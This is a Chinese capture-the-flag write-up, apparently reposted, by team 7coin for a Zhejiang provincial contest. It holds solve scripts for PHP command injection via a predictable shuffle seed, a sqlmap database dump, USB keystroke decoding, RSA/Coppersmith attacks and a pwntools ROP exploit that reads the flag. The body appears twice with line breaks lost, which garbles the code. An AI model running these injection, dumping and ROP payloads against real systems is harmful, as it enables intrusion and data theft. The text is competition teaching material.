# 浙江省第五届网络安全竞赛部分WP

> 原文: https://www.ctfiot.com/58989.html
> ID: 58989

团队成绩

队伍名称：7coin

队伍成绩：15

web

ezphp

开局给了源码，shuffle用来打乱顺序 但是他的顺序是根据种子来的

种子又是根据时间来的，所以我们可以提前算出时间 找出函数所在数组下标

算好后发送

$a[$_GET['b']]($a[$_GET['c']]);

调用system(“cat /flag”)得到flag

<?phperror_reporting(0);function getPOS($time_){ mt_srand($time_); $a = array("system","ls"); for ($i=0;$i<=10000;$i++){ array_push($a,"Ctfer"); } shuffle($a); //$a[$_GET['b']]($a[$_GET['c']]); echo "ntime:" . time() . "|"; $system = ""; $ls = ""; for($i=0;$i<10003;$i++){ if($a[$i] == "system"){ $system = $i; } if($a[$i] == "ls"){ $ls = $i; } } return [$system,$ls];}
for ($i=0; $i < 1; $i++) { $pos = getPOS(time() + $i); $system = $pos[0]; $ls = $pos[1]; $payload = "curl http://1.14.97.218:
29787/?cmd=cat%20/flag&b=$system&c=$ls"; echo shell_exec($payload);}//echo (shell_exec("curl $payload"));//echo "ntime:" . time() . "|";

python3 sqlmap.py -u url -D ctf --dump --batch --tamper=space2comment

FIWOIxqEZyIWJwIHEH1nJR1AZyECGyWKE1IME0qnFyMUAIAHF09ZE0qAJxEQGxcMFRSMIRSADyqAJGWHGIcHAD==

SVJBVkdRMlVJWjVURU1aWE1NMlRPTlJXR1VZR0daSlZHNVNUS09MR0dNWkRDTkpZSEFZVEFNQldNWTJUTVpUNQ==

??????????✅????ℹ⌨??✉?????ℹ☺?❓??????☃????????????????✅??????????????☺?????⏩??????✖???????

data:
000010000000000000000c000000000000000e000000000000002a000000000000001000000000000000040000000000000008000000000000002a0000000000000016000000000000000b000000000000000c000000000000001c000000000000002a000000000000002c0000000000020034000000000000002a0000000000020009000000000000000c000000000000001100000000000000070000000000020017000000000000002a0000000000020017000000000000000b00000000000000080000000000000012000000000000002a000000000002001500000000000000080000000000000004000000000000000f000000000000000a000000000000002a000000000002000e0000000000000008000000000000001c000000000000000a000000000000002a000000000000000400000000000000110000000000000007000000000000000f000000000000002a00000000000200100000000000000004000000000000000e00000000000000080000000000000008000000000000002a000000000002000c0000000000000017000000000002001e0000000000000007000000000000002a0000000000

import os
# /*os.system("tshark -r test.pcapng -T fields -e usb.capdata > usbdata.txt")*/normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":""","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}

nums = []keys = open('key.txt')for line in keys: #print(line) if len(line)!=17: continue nums.append(line[0:2]+line[4:6]) #取一、三字节 #print(nums)keys.close()output = ""for n in nums: if n[2:4] == "00" : continue if n[2:4] in normalKeys: if n[0:2]=="02": output += shiftKeys [n[2:4]] else : output += normalKeys [n[2:4]] else: output += '[unknown]'print('output :' + output)

output :
mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d

def Re(inputfile, outputfile): hex_list = [] with open(inputfile, 'rb') as f: while True: a = f.read(1) if (not a): break hex_list.append(a) mylist = hex_list[::-1] with open(outputfile, 'wb') as f: for value in mylist: f.write(value) print("complete!")Re("m4a", "flag.zip")

import gmpy2from Crypto.Util.number import *import math
str = 'abcdefghijklmnopqrstuvwxyz0123456789+='n = 176778040837484895481963794918312894811914463587783883976856801676290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726165605877196383212378074705385178610178824713153854530726380795438083708575716562524587045312909657881223522830729052758566504582290081411626333
key = n - 1c = 'u66hp7nuh01puoaip10pi6o0vzavnu11'flag = ''for i in c: num = str.index(i) ans = (num - 7) * gmpy2.invert(key,37) % 37 flag += str[ans]print('DASCTF{'+ flag +'}')#DASCTF{799a03b7a82076f5028059681df1b722}

ZmodN=Zmod(n)f(x) = x*ZmodN(pow(2,p0.nbits()))+p0

from Crypto.Util.number import *import tqdm
n = 21595945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747167248724184844583697034436158042499504967916978621608536213230969406811902366916932032050583747070735750876593573387957847683066895725722366706359818941065483471589153682177234707645138490589285500875222568286916243861325846262164331536570517513524474322519145470883352586121892275861245291051589531534179640139953079522307426687782419075644619898733819937782418589025945603603989100805716550707637938272890461563518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533c = 1500765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641612525534203652911807047718681392766077895625388064095459224402032253429115181543725938853591119977152518616563668740574496233135226296439754690903570240135657268737729815911404733486976376064060345507410815912670147466261149162470191619474107592103882894806322239740349433710606063058160148571050855845964674224651003832579701204330216602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664p = 1426723861968216959675536598409491243380171101180592446441649834738166786277745723654950385796320682900434611832789544257790278878742420696344225394624591657752431494779e = 65537PR.< x > = Zmod(n)[]for i in tqdm.tqdm(range(2 ** 15)): i = Integer(i) f = p + i * 2 ** (560) + x * 2 ** (560 + i.nbits()) res = f.monic().small_roots(X = 2 ^ (1024 - 560 - i.nbits()), beta=0.4) if res: print(res) p = p + i * 2 ** (560) + int(res[0]) * 2 ** (560 + i.nbits()) q = n // p if p * q == n: d = inverse(e,(p - 1) * (q - 1)) print(long_to_bytes(int(pow(c,d,n))))#b'DASCTF{ce73935b2e83a78aa5079a9e59ae4980}'

from pwn import *from time import *
context.log_level='debug'p=remote(ip,port)elf=ELF('./pwn')anjian='sssssdddwwwdddwdww's=0for i in anjian: for j in range(10): p.recvline() if i=='w': s+=1 if s>5: pass p.sendline(i)
popRax=0x0000000000400a4fsyscall=0x00000000004025abpopRdi=0x00000000004008f6popRsi=0x000000000040416fpopRdx=0x000000000051d4b6popRbx=0x0000000000402498popDxSi=0x000000000051d559buf=0x98a000leave=0x00000000004015cb#sysread=0x51D715#read write openpayload=p64(0)+p64(popRax)+p64(2)#openpayload+=p64(popRdi)+p64(0x0000000000af2faf)payload+=p64(popRsi)+p64(0)payload+=p64(syscall)payload+=p64(popRax)+p64(0)payload+=p64(popRdi)+p64(3)payload+=p64(popRsi)+p64(buf)payload+=p64(popRdx)+p64(0x100)payload+=p64(syscall)payload+=p64(popRax)+p64(1)payload+=p64(popRdi)+p64(1)payload+=p64(popRsi)+p64(buf)payload+=p64(popRdx)+p64(0x100)payload+=p64(syscall)rec=b''pa+=p64(popRdi)+p64(0)pa+=p64(popDxSi)+p64(0x100)+p64(buf+0x300)pa+=p64(syscall)+p64(leave)p.recvuntil('flag')p.sendline(b'a'*0x178+p64(buf+0x300)+rec)sleep(2)p.send(payload)p.interactive()


```
$a[$_GET['b']]($a[$_GET['c']]);
<?phperror_reporting(0);function getPOS($time_){ mt_srand($time_); $a = array("system","ls"); for ($i=0;$i<=10000;$i++){ array_push($a,"Ctfer"); } shuffle($a); //$a[$_GET['b']]($a[$_GET['c']]); echo "ntime:" . time() . "|"; $system = ""; $ls = ""; for($i=0;$i<10003;$i++){ if($a[$i] == "system"){ $system = $i; } if($a[$i] == "ls"){ $ls = $i; } } return [$system,$ls];}
for ($i=0; $i < 1; $i++) { $pos = getPOS(time() + $i); $system = $pos[0]; $ls = $pos[1]; $payload = "curl http://1.14.97.218:
29787/?cmd=cat%20/flag&b=$system&c=$ls"; echo shell_exec($payload);}//echo (shell_exec("curl $payload"));//echo "ntime:" . time() . "|";
python3 sqlmap.py -u url -D ctf --dump --batch --tamper=space2comment
FIWOIxqEZyIWJwIHEH1nJR1AZyECGyWKE1IME0qnFyMUAIAHF09ZE0qAJxEQGxcMFRSMIRSADyqAJGWHGIcHAD==
SVJBVkdRMlVJWjVURU1aWE1NMlRPTlJXR1VZR0daSlZHNVNUS09MR0dNWkRDTkpZSEFZVEFNQldNWTJUTVpUNQ==
base64-base32
??????????✅????ℹ⌨??✉?????ℹ☺?❓??????☃????????????????✅??????????????☺?????⏩??????✖???????
data:
000010000000000000000c000000000000000e000000000000002a000000000000001000000000000000040000000000000008000000000000002a0000000000000016000000000000000b000000000000000c000000000000001c000000000000002a000000000000002c0000000000020034000000000000002a0000000000020009000000000000000c000000000000001100000000000000070000000000020017000000000000002a0000000000020017000000000000000b00000000000000080000000000000012000000000000002a000000000002001500000000000000080000000000000004000000000000000f000000000000000a000000000000002a000000000002000e0000000000000008000000000000001c000000000000000a000000000000002a000000000000000400000000000000110000000000000007000000000000000f000000000000002a00000000000200100000000000000004000000000000000e00000000000000080000000000000008000000000000002a000000000002000c0000000000000017000000000002001e0000000000000007000000000000002a0000000000
import os
# /*os.system("tshark -r test.pcapng -T fields -e usb.capdata > usbdata.txt")*/normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":""","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}

nums = []keys = open('key.txt')for line in keys: #print(line) if len(line)!=17: continue nums.append(line[0:2]+line[4:6]) #取一、三字节 #print(nums)keys.close()output = ""for n in nums: if n[2:4] == "00" : continue if n[2:4] in normalKeys: if n[0:2]=="02": output += shiftKeys [n[2:4]] else : output += normalKeys [n[2:4]] else: output += '[unknown]'print('output :' + output)
output :
mik<DEL>mae<DEL>shiy<DEL><SPACE>:<DEL>FindT<DEL>Theo<DEL>Realg<DEL>Keyg<DEL>andl<DEL>Makee<DEL>It!d
def Re(inputfile, outputfile): hex_list = [] with open(inputfile, 'rb') as f: while True: a = f.read(1) if (not a): break hex_list.append(a) mylist = hex_list[::-1] with open(outputfile, 'wb') as f: for value in mylist: f.write(value) print("complete!")Re("m4a", "flag.zip")
import gmpy2from Crypto.Util.number import *import math
str = 'abcdefghijklmnopqrstuvwxyz0123456789+='n = 176778040837484895481963794918312894811914463587783883976856801676290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726165605877196383212378074705385178610178824713153854530726380795438083708575716562524587045312909657881223522830729052758566504582290081411626333
key = n - 1c = 'u66hp7nuh01puoaip10pi6o0vzavnu11'flag = ''for i in c: num = str.index(i) ans = (num - 7) * gmpy2.invert(key,37) % 37 flag += str[ans]print('DASCTF{'+ flag +'}')#DASCTF{799a03b7a82076f5028059681df1b722}
ZmodN=Zmod(n)f(x) = x*ZmodN(pow(2,p0.nbits()))+p0
from Crypto.Util.number import *import tqdm
n = 21595945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747167248724184844583697034436158042499504967916978621608536213230969406811902366916932032050583747070735750876593573387957847683066895725722366706359818941065483471589153682177234707645138490589285500875222568286916243861325846262164331536570517513524474322519145470883352586121892275861245291051589531534179640139953079522307426687782419075644619898733819937782418589025945603603989100805716550707637938272890461563518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533c = 1500765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641612525534203652911807047718681392766077895625388064095459224402032253429115181543725938853591119977152518616563668740574496233135226296439754690903570240135657268737729815911404733486976376064060345507410815912670147466261149162470191619474107592103882894806322239740349433710606063058160148571050855845964674224651003832579701204330216602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664p = 1426723861968216959675536598409491243380171101180592446441649834738166786277745723654950385796320682900434611832789544257790278878742420696344225394624591657752431494779e = 65537PR.< x > = Zmod(n)[]for i in tqdm.tqdm(range(2 ** 15)): i = Integer(i) f = p + i * 2 ** (560) + x * 2 ** (560 + i.nbits()) res = f.monic().small_roots(X = 2 ^ (1024 - 560 - i.nbits()), beta=0.4) if res: print(res) p = p + i * 2 ** (560) + int(res[0]) * 2 ** (560 + i.nbits()) q = n // p if p * q == n: d = inverse(e,(p - 1) * (q - 1)) print(long_to_bytes(int(pow(c,d,n))))#b'DASCTF{ce73935b2e83a78aa5079a9e59ae4980}'
from pwn import *from time import *
context.log_level='debug'p=remote(ip,port)elf=ELF('./pwn')anjian='sssssdddwwwdddwdww's=0for i in anjian: for j in range(10): p.recvline() if i=='w': s+=1 if s>5: pass p.sendline(i)
popRax=0x0000000000400a4fsyscall=0x00000000004025abpopRdi=0x00000000004008f6popRsi=0x000000000040416fpopRdx=0x000000000051d4b6popRbx=0x0000000000402498popDxSi=0x000000000051d559buf=0x98a000leave=0x00000000004015cb#sysread=0x51D715#read write openpayload=p64(0)+p64(popRax)+p64(2)#openpayload+=p64(popRdi)+p64(0x0000000000af2faf)payload+=p64(popRsi)+p64(0)payload+=p64(syscall)payload+=p64(popRax)+p64(0)payload+=p64(popRdi)+p64(3)payload+=p64(popRsi)+p64(buf)payload+=p64(popRdx)+p64(0x100)payload+=p64(syscall)payload+=p64(popRax)+p64(1)payload+=p64(popRdi)+p64(1)payload+=p64(popRsi)+p64(buf)payload+=p64(popRdx)+p64(0x100)payload+=p64(syscall)rec=b''pa+=p64(popRdi)+p64(0)pa+=p64(popDxSi)+p64(0x100)+p64(buf+0x300)pa+=p64(syscall)+p64(leave)p.recvuntil('flag')p.sendline(b'a'*0x178+p64(buf+0x300)+rec)sleep(2)p.send(payload)p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/7-1664245658.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1664245659.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1664245659.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/5-1664245660.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/1-1664245660.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/1-1664245660.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/2-1664245661.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/10-1664245661.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/10-1664245662.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/3-1664245662.jpg)